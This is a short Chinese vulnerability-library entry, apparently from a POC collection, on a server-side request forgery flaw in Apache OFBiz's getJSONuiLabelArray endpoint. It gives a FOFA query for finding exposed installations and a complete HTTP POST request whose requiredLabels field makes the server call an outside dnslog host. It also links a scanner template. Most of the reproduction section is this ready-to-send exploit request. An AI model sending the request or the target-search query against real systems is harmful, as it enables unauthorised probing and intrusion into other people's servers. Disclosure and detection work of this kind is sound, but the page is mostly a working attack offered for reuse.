---

source: "wy876 漏洞文库"
---

# Apace OFBiz getJSONuiLabelArray存在服务端请求伪造ssrf漏洞

# 一、漏洞简介
<font style="color:rgb(36, 41, 46);">Apache OFBiz是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。OFBiz最主要的特点是OFBiz提供了一整套的开发基于Java的web应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。Apace OFBiz getJSONuiLabelArray存在服务端请求伪造ssrf漏洞。</font>

# <font style="color:rgb(36, 41, 46);">二、影响版本</font>
+ Apace OFBiz

# 三、资产测绘
+ fofa`app="Apache_OFBiz"`
+ 特征


# 四、漏洞复现
1. 获取dnslog地址

```plain
v3f9em.dnslog.cn
```


2. 测试是否存在漏洞

```plain
POST /partymgr/control/getJSONuiLabelArray HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Content-Length: 79
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded

requiredLabels={"https://v3f9em.dnslog.cn/api":["2aZ6okJyCI0H8XLAUeiv9Yu3wOK"]}
```


[apache-OFBiz-getjsonuilabelarray-服务端请求伪造.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222253157-27d1351f-0247-4560-b9a5-3c8db0b44532.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ciyvexuvwfhmzuq5>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
